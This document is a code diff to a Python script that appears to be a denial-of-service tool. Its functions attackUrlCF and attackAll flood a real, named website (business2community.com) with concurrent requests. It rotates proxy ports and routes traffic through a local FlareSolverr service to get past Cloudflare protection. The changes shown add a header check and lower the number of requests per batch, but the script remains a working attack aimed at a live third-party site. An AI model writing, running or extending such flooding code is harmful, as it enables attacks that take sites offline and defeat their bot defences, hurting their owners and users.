@@ -35,6 +35,9 @@ def checkmyHeaders():
 	print(resStr)
 	input()
 
+	print(requests.get(url).content)
+	input()
+
 def changeProxies():
 	PORT=random.randrange(10001,22048)
 	PROXY_URL = PROXY_URL_BASE.replace('PORT',str(PORT))
@@ -103,7 +106,7 @@ def attackUrlCF(baseUrl, threadNumber):
 			# checkIp()
 
 			requestsArr = []
-			for x in range(10):
+			for x in range(1):
 				requestsArr.append(grequests.get(url, headers=headers, proxies=proxies))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
@@ -133,6 +136,8 @@ def attackAll():
 
 
 flareSolverUrl = 'http://localhost:8191/v1'
+
+checkmyHeaders()
 
 for i in range(1):
 	Thread(target=attackUrlCF, args=['https://www.business2community.com', i]).start()
